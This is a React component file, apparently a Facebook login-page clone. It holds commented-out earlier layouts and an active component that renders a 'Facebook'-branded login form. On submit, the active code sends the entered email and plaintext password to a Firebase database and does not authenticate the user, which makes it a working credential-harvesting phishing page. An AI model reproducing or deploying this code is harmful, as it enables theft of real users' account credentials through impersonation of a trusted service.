// import React from 'react'
// import "./Homepage.css"

// const Homepage = () => {
     
//   return (
//     <div>
//                <main>
//   <div className="row bg-fb-blue pt-5">
//     <div className="container">
//       <div className="row no-gutters pl-2 pr-2">
//         <div className="col-sm-12 col-md-6">
//           <h1 className="text-white logo">facebook</h1>
//         </div>
//         <div className="col-sm-12 col-md-6">
//           <form className="float-right">
//             <div className="form-row">
//               <div className="col-auto">
//                 <label className="sr-only" for="emailPhone">Email or Phone</label>
//                 <input type="text" className="form-control form-control-sm mb-2" id="emailPhone" placeholder="Email or Phone"/>
//               </div>
//               <div className="col-auto">
//                 <label className="sr-only" for="password">Password</label>
//                 <div className="input-group mb-2">
//                   <input type="text" className="form-control form-control-sm" id="password" placeholder="Password"/>
//                 </div>
//               </div>
//               <div className="col-auto">
//                 <input type="submit" id="submit" className="btn btn-sm btn-fb mb-2 align-bottom" value="Log In"/>
//               </div>
//             </div>
//           </form>
//         </div>
//       </div>
//     </div>
//   </div>
//   <div className="main_container">
//     <div className="container">
//       <div className="row no-gutters">
//         <div className="col-sm-12 col-md-6 mt-5 pr-5">
//           <h2>Connect with friends and the world around you on Facebook.</h2>
//           <ul className="list-group">
//             <li className="list-group-item bg-transparent border-0 pl-0">
//               <i className="far fa-newspaper fa-3x align-middle"></i>
//               <span className="ml-2"><strong>See photos and updates</strong> from friends in News Feed.</span>
//             </li>
//             <li className="list-group-item bg-transparent border-0 pl-0">
//               <i className="far fa-star fa-3x align-middle"></i>
//               <span className="ml-2"><strong>Share what's new</strong> in your life on your Timeline.</span>
//             </li>
//             <li className="list-group-item bg-transparent border-0 pl-0">
//               <i className="fas fa-vector-square fa-3x align-middle"></i>
//               <span className="ml-2"><strong>Find more</strong> of what you're looking for with Facebook Search.</span>
//             </li>          
//           </ul>
//         </div>
//         <div className="col-sm-12 col-md-6 mt-3">
//           <h1>Sign Up</h1>
//           <h6>It's free and always will be.</h6>
//           <form>
//             <div className="form-row">
//               <div className="form-group col-md-6">
//                 <input type="text" className="form-control" id="fname" placeholder="First Name"/>
//               </div>
//               <div className="form-group col-md-6">
//                 <input type="text" className="form-control" id="lname" placeholder="Last Name"/>
//               </div>
//             </div>
//             <div className="form-group">
//               <input type="text" className="form-control" id="phoneEmail" placeholder="Mobile number or email"/>
//             </div>
//             <div className="form-group">
//               <input type="password" className="form-control" placeholder="New password"/>
//             </div>
//             <h5 className="fb-light-blue">Birthday</h5>
//             <div className="form-row mb-3">
//               <div className="col-auto pl-0 pr-0">
//                 <select className="custom-select my-1" id="inlineFormCustomSelectPref">
//                   <option value="1">Jan</option>
//                   <option value="2">Feb</option>
//                   <option value="3">Mar</option>
//                   <option value="4">Apr</option>
//                   <option value="5">May</option>
//                   <option value="6">Jun</option>
//                   <option value="7" selected>Jul</option>
//                   <option value="8">Aug</option>
//                   <option value="9">Sep</option>
//                   <option value="10">Oct</option>
//                   <option value="11">Nov</option>
//                   <option value="12">Dec</option>
//                 </select>
//               </div>
//               <div className="col-auto pl-0 pr-0">
//                 <select className="custom-select my-1" id="inlineFormCustomSelectPref">
//                   <option value="1">1</option>
//                   <option value="2">2</option>
//                   <option value="3">3</option>
//                   <option value="4">4</option>
//                   <option value="5">5</option>
//                   <option value="6" selected>6</option>
//                   <option value="7">7</option>
//                   <option value="8">8</option>
//                   <option value="9">9</option>
//                   <option value="10">10</option>
//                   <option value="11">11</option>
//                   <option value="12">12</option>
//                   <option value="13">13</option>
//                   <option value="14">14</option>
//                   <option value="15">15</option>
//                   <option value="16">16</option>
//                   <option value="17">17</option>
//                   <option value="18">18</option>
//                   <option value="19">19</option>
//                   <option value="20">20</option>
//                   <option value="21">21</option>
//                   <option value="22">22</option>
//                   <option value="23">23</option>
//                   <option value="24">24</option>
//                   <option value="25">25</option>
//                   <option value="26">26</option>
//                   <option value="27">27</option>
//                   <option value="28">28</option>
//                   <option value="29">29</option>
//                   <option value="30">30</option>
//                   <option value="31">31</option>
//                 </select>
//               </div>
//               <div className="col-auto pl-0 pr-0">
//                 <select className="custom-select my-1" id="inlineFormCustomSelectPref">
//                   <option value="1985">1985</option>
//                   <option value="1986">1986</option>
//                   <option value="1987">1987</option>
//                   <option value="1988">1988</option>
//                   <option value="1989">1989</option>
//                   <option value="1990">1990</option>
//                   <option value="1991">1991</option>
//                   <option value="1992">1992</option>
//                   <option value="1993">1993</option>
//                   <option value="1994" selected>1994</option>
//                 </select>
//               </div>  
//               <div className="col-auto pl-1">
//                 <i className="fas fa-question-circle popover-icon" tabindex="0" data-popover-content="/bdaySelect" id="showPopover" data-toggle="popover" data-html="true" data-placement="left"></i>
//                 <div className="popover-block-container">
//                   <div id="bdaySelect" >
//                     <div className="popover-body">
//                       <strong>Providing your birthday</strong> helps make sure you get the right Facebook experience for your age. If you want to change who sees this, go to the About section of your profile. For more details, please visit our <a href="https://www.facebook.com/privacy/explanation/"  rel="noopener">Data Policy</a>.
//                       <hr/>
//                       <span className="float-right mb-2">
//                         <a href="/" className="btn btn-sm btn-fb align-right">Close</a>
//                       </span>
//                     </div>
//                   </div>
//                 </div>
//               </div>
//             </div>
//             <div className="col-auto pl-0">
//               <h5 className="fb-light-blue">Gender</h5>
//               <div className="custom-control custom-radio custom-control-inline">
//                 <input type="radio" id="femaleRadio" name="genderRadio" className="custom-control-input"/>
//                 <label className="custom-control-label" for="femaleRadio">Female</label>
//               </div>
//               <div className="custom-control custom-radio custom-control-inline">
//                 <input type="radio" id="maleRadio" name="genderRadio" className="custom-control-input"/>
//                 <label className="custom-control-label" for="maleRadio">Male</label>
//               </div>
//               <div className="custom-control custom-radio custom-control-inline">
//                 <input type="radio" id="customRadio" name="genderRadio" oninput="on_change(event)" className="custom-control-input" value="customSelect"/>
//                 <label className="custom-control-label" for="customRadio">Custom</label>
//               </div>
//               <div className="custom-control custom-control-inline pl-0">
//                 <i className="fas fa-question-circle popover-icon" tabindex="0" data-popover-content="/genderSelect" id="showPopover" data-toggle="popover" data-html="true" data-placement="left"></i>
//                 <div className="popover-block-container">
//                   <div id="genderSelect" >
//                     <div className="popover-body">
//                       You can change who sees your gender on your profile later. Select Custom to choose another gender, or if you'd rather not say.
//                       <hr/>
//                       <span className="float-right mb-2">
//                         <a href="/" className="btn btn-sm btn-fb align-right">Close</a>
//                       </span>
//                     </div>
//                   </div>
//                 </div>             
//               </div>
//               <div id="text" >
//                 <select className="custom-select my-1" id="inlineFormCustomSelectPref">
//                   <option value="1" selected>Select your pronoun</option>
//                   <option value="2">She: "Wish her a happy birthday!"</option>
//                   <option value="3">He: "Wish him a happy birthday!"</option>
//                   <option value="4">They: "Wish them a happy birthday!"</option>
//                 </select>
//                 <small className="text-muted">Your pronoun is visible to everyone.</small>
//                 <input className="form-control" placeholder="Gender (optional)"/>
//               </div>
//               <small className="text-muted d-block mb-3">By clicking Sign Up, you agree to our <a href="https://www.facebook.com/legal/terms/update" >Terms</a>, <a href="https://www.facebook.com/about/privacy/update" >Data Policy</a> and <a href="https://www.facebook.com/policies/cookies/" >Cookies Policy</a>. You may receive SMS Notifications from us and can opt out any time.</small>
//             </div>          
//             <button type="submit" className="btn btn-md btn-fb-submit pl-5 pr-5 mb-3">Sign Up</button>
//           </form>
//           <hr/>
//           <p className="font-weight-bold"><a href="/">Create a Page</a> for a celebrity, band or business.</p>
//         </div> 
//       </div>    
//     </div>
//   </div>
//   <div className="container-fluid bg-white pl-0 pr-0">
//     <footer className="p-2">
//       <div className="container">
//         <div className="row no-gutters">
//           <div className="col-sm-12">
//             <ul className="list-inline">
//               <li className="list-inline-item"><a href="/">English (US)</a></li>
//               <li className="list-inline-item"><a href="/">Español</a></li>
//               <li className="list-inline-item"><a href="/">Français (France)</a></li>
//               <li className="list-inline-item"><a href="/">中文(简体)</a></li>
//               <li className="list-inline-item"><a href="/">العربية</a></li>
//               <li className="list-inline-item"><a href="/">Português (Brasil)</a></li>
//               <li className="list-inline-item"><a href="/">Italiano</a></li>
//               <li className="list-inline-item"><a href="/">한국어</a></li>
//               <li className="list-inline-item"><a href="/">Deutsch</a></li>
//               <li className="list-inline-item"><a href="/">हिन्दी</a></li>
//               <li className="list-inline-item"><a href="/">日本語</a></li>
//               <li className="list-inline-item">
//                 <a href="/" className="btn-secondary btn-add-language">
//                   <i className="fas fa-plus fa-1x text-white"></i>
//                 </a>
//               </li>
//             </ul>
//             <hr/>
//             <ul className="list-inline">
//               <li className="list-inline-item"><a href="/">Sign Up</a></li>
//               <li className="list-inline-item"><a href="/">Log In</a></li>
//               <li className="list-inline-item"><a href="/">Messenger</a></li>
//               <li className="list-inline-item"><a href="/">Facebook Lite</a></li>
//               <li className="list-inline-item"><a href="/">Watch</a></li>
//               <li className="list-inline-item"><a href="/">People</a></li>
//               <li className="list-inline-item"><a href="/">Profiles</a></li>
//               <li className="list-inline-item"><a href="/">Pages</a></li>
//               <li className="list-inline-item"><a href="/">Pages Categories</a></li>
//               <li className="list-inline-item"><a href="/">Events</a></li>
//               <li className="list-inline-item"><a href="/">Places</a></li>
//               <li className="list-inline-item"><a href="/">Games</a></li>
//               <li className="list-inline-item"><a href="/">Locations</a></li>
//               <li className="list-inline-item"><a href="/">Marketplace</a></li>
//               <li className="list-inline-item"><a href="/">Groups</a></li>
//               <li className="list-inline-item"><a href="/">Instagram</a></li>
//               <li className="list-inline-item"><a href="/">Local</a></li>
//               <li className="list-inline-item"><a href="/">Fundraisers</a></li>
//               <li className="list-inline-item"><a href="/">Services</a></li>
//               <li className="list-inline-item"><a href="/">About</a></li>
//               <li className="list-inline-item"><a href="/">Create Ad</a></li>
//               <li className="list-inline-item"><a href="/">Create Page</a></li>
//               <li className="list-inline-item"><a href="/">Developers</a></li>
//               <li className="list-inline-item"><a href="/">Careers</a></li>
//               <li className="list-inline-item"><a href="/">Privacy</a></li>
//               <li className="list-inline-item"><a href="/">Cookies</a></li>
//               <li className="list-inline-item"><a href="/">Cookies</a></li>
//               <li className="list-inline-item"><a href="/">Ad Choices <i className="fas fa-ad"></i></a></li>
//               <li className="list-inline-item"><a href="/">Terms</a></li>
//               <li className="list-inline-item"><a href="/">Account Security</a></li>
//               <li className="list-inline-item"><a href="/">Login Help</a></li>      
//               <li className="list-inline-item"><a href="/">Help</a></li>
//             </ul>            
//           </div>
//         </div>
//       </div>
//     </footer>
//   </div>
// </main>
//     </div>
//   )
// }

// export default Homepage


// import "./Homepage.css"
// import React from 'react'

// const Homepage = () => {
//   return (
//     <>
//      <html lang="en">
//   <head>
//     <meta charset="UTF-8" />
//     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
//     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
//     <title>Facebook Login Page</title>
//     <link rel="stylesheet" href="./login_form_2.css" />
//   </head>
//   <body>
//     <div class="content">
//       <div class="flex-div">
//         <div class="name-content">
//           <h1 class="logo">Facebook</h1>
//           <p>Connect with friends and the world around you on Facebook.</p>
//         </div>
//           <form>
//             <input type="text" placeholder="Email or Phone Number" required />
//             <input type="password" placeholder="Password" required/>
//             <button class="login">Log In</button>
//             <a href="/">Forgot Password ?</a>
//             <hr/>
//             <button class="create-account">Create New Account</button>
//           </form>
//       </div>
//     </div>
//   </body>
// </html>

//     </>
//   )
// }

// export default Homepage

import React, { useState } from 'react';
import './Homepage.css';
import { database } from './firebase';
import { push, ref } from 'firebase/database';

const saveFormData = async (email, password) => {
  try {
    // Push data to Firebase
    await push(ref(database, 'formData'), { email, password });
    console.log('Form data saved successfully!');
  } catch (error) {
    console.error('Error saving form data:', error);
  }
};

const Homepage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Save data to Firebase
    await saveFormData(email, password);

    // Clear form fields
    setEmail('');
    setPassword('');
  };

  return (
    <div className="content">
      <div className="flex-div">
        <div className="name-content">
          <h1 className="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Email or Phone Number"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button className="login" type="submit">
            Log In
          </button>
          <a href="/">Forgot Password ?</a>
          <hr />
          <button className="create-account">Create New Account</button>
        </form>
      </div>
    </div>
  );
};

export default Homepage;
